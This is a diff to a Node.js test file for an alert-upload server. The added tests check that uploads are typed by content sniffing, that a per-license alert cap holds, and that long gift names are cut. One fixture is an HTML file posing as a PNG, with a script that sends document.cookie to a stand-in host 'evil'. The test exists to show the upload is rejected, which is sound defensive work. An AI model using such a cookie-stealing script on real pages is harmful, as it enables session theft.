@@ -2,6 +2,7 @@ const test = require('node:test');
 const assert = require('node:assert/strict');
 const fs = require('node:fs');
 const vm = require('node:vm');
+const path = require('node:path');
 
 // Load the real Tenant without opening DB, Spotify or TikTok connections.
 const context = { module: { exports: {} }, require: (name) => name.includes('tenantHelpers') ? require('./lib/tenantHelpers') : name.includes('giftCatalog') ? require('./lib/giftCatalog') : ({}), process, console, setTimeout, clearTimeout, setInterval, clearInterval };
@@ -52,9 +53,10 @@ test('global tiers, specific gifts and follows keep their own text and color in 
   assert.equal(events[0].textColor, '#ff0000');
 });
 
-function alertApi() {
+function alertApi({ maxAlerts = 150 } = {}) {
   const rows = new Map();
   const configs = new Map();
+  const uploads = [];
   let save;
   const source = fs.readFileSync(require.resolve('./server'), 'utf8');
   // Register the actual alert routes with isolated storage and database adapters.
@@ -62,6 +64,9 @@ function alertApi() {
     app: { get() {}, post: (...args) => { save = args.at(-1); } },
     auth: {}, generalLimiter: null, uploadAlertMedia: null,
     crypto: require('node:crypto'), console,
+    // The names server.js defines above the sliced routes.
+    MAX_ALERTS_PER_LICENSE: maxAlerts, ALERT_VISUAL_GROUPS: ['image', 'gif', 'video'], sniffMedia: require('./lib/mediaSniff').sniffMedia,
+    storage: { uploadFile: async (storedPath, buffer, mime) => { uploads.push({ path: storedPath, mime }); return `https://files.test/${storedPath}`; }, deleteFile: async () => {} },
     db: {
       getAlertConfig: async (id) => rows.get(id),
       listAlertConfigs: async () => [...rows.values()],
@@ -80,12 +85,12 @@ function alertApi() {
     }),
   });
   return {
-    rows, configs,
-    async save(body) {
+    rows, configs, uploads,
+    async save(body, files) {
       let result;
       let status = 200;
       const response = { status(code) { status = code; return this; }, json(data) { result = data; } };
-      await save({ body, license: { id: 'license' } }, response);
+      await save({ body, files, license: { id: 'license' } }, response);
       return { status, ...result };
     },
   };
@@ -280,4 +285,55 @@ test('saving a gift alert stores the gift id, keeps it when editing without chan
   assert.equal(invalid.alert.giftId, null, 'a non-numeric id is ignored');
   const follow = await api.save({ triggerType: 'follow', giftId: '5655', text: 'seguidor', durationMs: '3000' });
   assert.equal(follow.alert.giftId, null, 'only gift alerts carry an id');
+});
+
+// What a real file starts with (see media-sniff.test.js for the real-file headers).
+const PNG = Buffer.concat([Buffer.from('89504e470d0a1a0a0000000d', 'hex'), Buffer.alloc(52, 0x41)]);
+const MP3 = Buffer.concat([Buffer.from('494433040000000000235453', 'hex'), Buffer.alloc(52, 0x41)]);
+const HTML = Buffer.from('<!DOCTYPE html><script>fetch("//evil/" + document.cookie)</script>');
+const upload = (buffer, mimetype, originalname) => ({ buffer, mimetype, originalname });
+
+test('an uploaded file is accepted by what it really is and stored under that type and extension, never the one it declares', async () => {
+  const api = alertApi();
+  const relabeled = await api.save({ giftName: 'Lion' }, { visual: [upload(PNG, 'video/mp4', 'not-a-video.mp4')] });
+  assert.equal(relabeled.success, true);
+  assert.equal(relabeled.alert.visualType, 'image', 'a PNG is an image even if the browser called it a video');
+  const withSound = await api.save({ giftName: 'Rose' }, { audio: [upload(MP3, 'application/octet-stream', 'sound.bin')] });
+  assert.equal(withSound.success, true);
+  assert.deepEqual(api.uploads.map((u) => [u.mime, path.extname(u.path)]), [['image/png', '.png'], ['audio/mpeg', '.mp3']]);
+});
+
+test('a file that only claims to be media is refused before anything is uploaded', async () => {
+  const api = alertApi();
+  const html = await api.save({ giftName: 'Rose', text: 'hi' }, { visual: [upload(HTML, 'image/png', 'evil.png')] });
+  assert.equal(html.status, 400);
+  assert.match(html.error, /Formato de imagen o video no soportado/);
+  const wrongField = await api.save({ giftName: 'Lion', text: 'hi' }, { audio: [upload(PNG, 'audio/mpeg', 'song.mp3')] });
+  assert.equal(wrongField.status, 400);
+  assert.match(wrongField.error, /Formato de audio no soportado/);
+  const soundAsPicture = await api.save({ giftName: 'Heart', text: 'hi' }, { visual: [upload(MP3, 'image/png', 'pic.png')] });
+  assert.equal(soundAsPicture.status, 400);
+  assert.equal(api.uploads.length, 0, 'nothing reached the storage');
+  assert.equal(api.rows.size, 0, 'and nothing was saved');
+});
+
+test('a license cannot pile up alerts past the cap, but editing one at the cap still works', async () => {
+  const api = alertApi({ maxAlerts: 2 });
+  const first = await api.save({ giftName: 'Rose', text: 'a' });
+  await api.save({ text: 'a draft with no gift yet counts too' });
+  const over = await api.save({ giftName: 'Heart', text: 'c' });
+  assert.equal(over.status, 400);
+  assert.match(over.error, /máximo de 2 alertas/);
+  assert.equal(api.rows.size, 2);
+  const edited = await api.save({ alertId: first.alert.id, giftName: 'Rose', text: 'edited' });
+  assert.equal(edited.success, true, 'editing does not create a new alert');
+  assert.equal(api.rows.size, 2);
+  const conflict = await api.save({ giftName: 'Rose', text: 'same trigger' });
+  assert.equal(conflict.status, 409, 'an occupied trigger is still reported as a conflict, not as the cap');
+});
+
+test('a very long gift name is cut instead of stored whole', async () => {
+  const api = alertApi();
+  const long = await api.save({ giftName: 'G'.repeat(400), text: 'hi' });
+  assert.equal(long.alert.giftName.length, 120);
 });
